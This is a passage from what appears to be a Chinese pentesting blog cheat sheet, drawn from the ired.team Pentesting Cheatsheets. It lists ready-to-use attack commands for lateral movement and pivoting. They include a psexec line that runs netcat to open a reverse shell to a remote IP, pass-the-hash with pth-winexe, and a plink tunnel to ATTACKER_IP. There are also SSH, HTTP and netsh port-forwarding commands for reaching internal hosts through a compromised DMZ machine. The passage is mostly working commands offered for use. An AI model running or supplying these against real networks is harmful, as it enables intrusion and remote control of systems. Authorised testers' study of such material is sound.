cmd.exe</code></pre><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><pre><code class="shell">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe</code></pre><h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><pre><code class="shell">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe</code></pre><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h3><pre><code class="shell"># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER# Scenario: access a host that&#39;s being blocked by a firewall via SSH_SERVER;ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER</code></pre><h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><pre><code class="shell"># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;ssh -D 127.0.0.1:8080 user@SSH_SERVER</code></pre><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><pre><code class="shell"># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389# Scenario: expose RDP on non-routable network;ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVERplink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP</code></pre><h3 id="Proxy-Tunnel"><a href="#Proxy-Tunnel" class="headerlink" title="Proxy Tunnel"></a>Proxy Tunnel</h3><pre><code class="shell"># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128# Scenario: a remote host has SSH running, but it&#39;s only bound to 127.0.0.1, but you want to reach it;proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555ssh user@127.0.0.1 -p 5555</code></pre><h3 id="HTTP隧道-SSH-Over-HTTP"><a href="#HTTP隧道-SSH-Over-HTTP" class="headerlink" title="HTTP隧道: SSH Over HTTP"></a>HTTP隧道: SSH Over HTTP</h3><pre><code class="shell"># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22hts -F localhost:22 80# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80htc -F 8080 192.168.1.15:80# Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22ssh localhost -p 8080</code></pre><h3 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h3><pre><code class="shell">#添加一个IPV4到IPV4的端口映射netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.75.130  connectport=8080#指定监听ip和端口可以删除netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4445#查看存在的转发netsh interface portproxy show all</code></pre><blockquote><p>参考链接：<a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">Pentesting Cheatsheets</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CheckList </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
